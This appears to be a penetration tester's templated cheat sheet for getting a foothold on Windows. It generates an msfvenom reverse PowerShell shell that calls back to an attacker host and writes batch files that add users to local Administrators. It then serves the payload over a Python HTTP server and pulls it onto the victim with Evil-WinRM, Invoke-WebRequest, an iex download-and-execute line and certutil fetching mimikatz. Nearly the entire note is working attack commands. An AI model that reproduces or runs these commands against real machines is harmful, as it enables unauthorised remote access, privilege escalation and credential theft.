
1- generate the reverse shell (not my best thing)
```powershell
msfvenom -p cmd/windows/reverse_powershell lhost=<% tp.frontmatter["LHOST"] %> lport=1337  > shell.bat  
```


other bat shell 
AD 
```powershell
subl shell.bat
```

1.1-  add <% tp.frontmatter["domain-username"] %> as administrator directly.
```powershell
@echo off
:: Replace USERNAME with the account name you want to add
net localgroup Administrators <% tp.frontmatter["domain-username"] %> /add
```

1.2- create a new user and add them as administrator. 
```powershell
@echo off
:: Create a new user with password
net user pentest Passw0rd! /add
:: Add that user to Administrators group
net localgroup Administrators pentest /add
```

1.3- use powershell to add  as administrator directly.
```powershell
@echo off
powershell -Command "Add-LocalGroupMember -Group 'Administrators' -Member '<% tp.frontmatter["domain-username"] %>'"
```

2- start python server 
```powershell
python3 -m http.server 80
```


3- upload the reverse shell to victim machine 

[Evil-WinRM](6-%20Zettelkasten/Evil-WinRM.md)
```powershell
upload shell.bat
```


```powershell
iwr -uri http://<% tp.frontmatter["LHOST"] %>/shell.bat -Outfile shell.bat
powershell -c "Invoke-WebRequest -Uri 'http://<% tp.frontmatter["LHOST"] %>/shell.bat' -OutFile 'C:\Users\Public\shell.bat'"
iex(new-object net.webclient).downloadstring("http://<% tp.frontmatter["LHOST"] %>/shell.bat")
certutil -urlcache -split -f "http://<% tp.frontmatter["LHOST"] %>/mimikatz.exe" 'C:\Users\Public\shell.bat'
```

